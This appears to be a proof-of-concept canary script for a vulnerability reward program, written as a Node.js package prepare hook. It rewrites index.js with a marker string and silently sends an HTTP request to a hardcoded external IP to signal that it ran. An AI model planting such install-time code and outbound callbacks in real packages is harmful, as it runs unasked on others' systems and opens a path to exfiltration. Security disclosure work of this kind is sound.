'use strict';

const fs = require('fs');
const http = require('http');

fs.writeFileSync(
  'index.js',
  "'use strict';\n\nmodule.exports = 'CODEX_DATAFORM_CUSTOM_REGISTRY_PREPARE_RAN_V1';\n"
);

const request = http.get({
  hostname: '136.65.102.24',
  port: 18082,
  path: '/df-vrp-custom-registry-prepare-callback-v1',
  headers: {'User-Agent': 'Dataform-VRP-fixed-canary-v1'},
  timeout: 3000
}, response => response.resume());

request.on('timeout', () => request.destroy());
request.on('error', () => {});
